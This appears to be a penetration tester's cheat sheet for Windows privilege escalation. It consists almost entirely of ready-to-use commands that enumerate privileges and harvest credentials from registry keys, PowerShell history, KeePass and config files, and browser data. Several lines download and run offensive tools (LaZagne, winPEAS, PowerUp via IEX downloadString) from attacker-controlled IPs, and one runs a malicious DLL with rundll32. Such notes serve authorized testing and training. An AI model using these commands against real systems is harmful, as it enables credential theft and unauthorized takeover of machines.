
> [!NOTE] Note
> set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;
```powershell
whoami /priv
whoami /groups

set 

tasklist /svc

cmdkey /list

systeminfo
wmic qfe list brief

net user
net user <current user>
net localgroup
query user
net accounts

Get-History
(Get-PSReadlineOption).HistorySavePath
gc (Get-PSReadlineOption).HistorySavePath
ls C:\Users\bob\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\
foreach($user in ((ls C:\users).fullname)){gc "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}


ipconfig /all
netstat -ano
tasklist /svc | findstr <PID>
route print

dir C:\
dir "C:\Program Files"
dir "C:\Program Files (x86)"

Get-WmiObject -Class Win32_Product |  select Name, Version
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
reg query "HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions"
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

services
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
icacls <service binary path>

$env:AppKey

gci -Path C:\ -Include *.kdbx,*.git -File -Recurse -ErrorAction SilentlyContinue
gci -Path C:\xampp -Include *.txt,*.ini,*.yml,*.config -File -Recurse -ErrorAction SilentlyContinue
gci -Path C:\inetpub\wwwroot -Include *.txt,*.ini,*.yml,*.config -File -Recurse -ErrorAction SilentlyContinue
gci -Path C:\Users\ -Include *.exe,*.txt,*.rdp,*.pdf,*.xls,*.xlsx,*.xml,*.doc,*.docx,*.ps1,*.bat,*.ini,*.yml*,.config -File -Recurse -ErrorAction SilentlyContinue
gci -h -Path C:\Users\ -Include *.exe,*.txt,*.rdp,*.pdf,*.xls,*.xlsx,*.xml,*.doc,*.docx,*.ps1,*.bat,*.ini,*.yml,*.config -File -Recurse -ErrorAction SilentlyContinue
gci C:\Users\Public
gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password


gci \\.\pipe\
accesschk.exe -accepteula -w \pipe\WindscribeService -v

where.exe /R C:\Windows bash.exe
where.exe /R C:\Windows wsl.exe
where.exe /R C:\ MultimasterAPI.dll
where.exe /R C:\ unattend.xml
where.exe /R C:\ *.config
```
1.  Snoop on processes
```powershell
Import-Module .\Watch-Command.ps1
Get-Process | watch-command -diff -cont -verbose -property "Image Name"
```
2. Run Lazagne
```powershell
iwr http://10.10.15.155/lazagne.exe -o lazagne.exe 
lazagne.exe /all
```
3. Run PEAS,
```powershell
curl 192.168.45.x/winPEAS.exe -o winpeas.exe
.\winpeas.exe
```
4. PowerUp
```powershell
IEX(New-Object Net.WebClient).downloadString('http://192.168.45.x/PowerUp.ps1');Invoke-Allchecks
```
5. Running the `sysinfo` command shows us that the system is of x86 bit architecture, giving us even more reason to trust the Local Exploit Suggester
```
post/multi/recon/local_exploit_suggester
```

Run malicious DLL
```powershell
rundll32 shell32.dll,Control_RunDLL C:\temp\mal.dll
```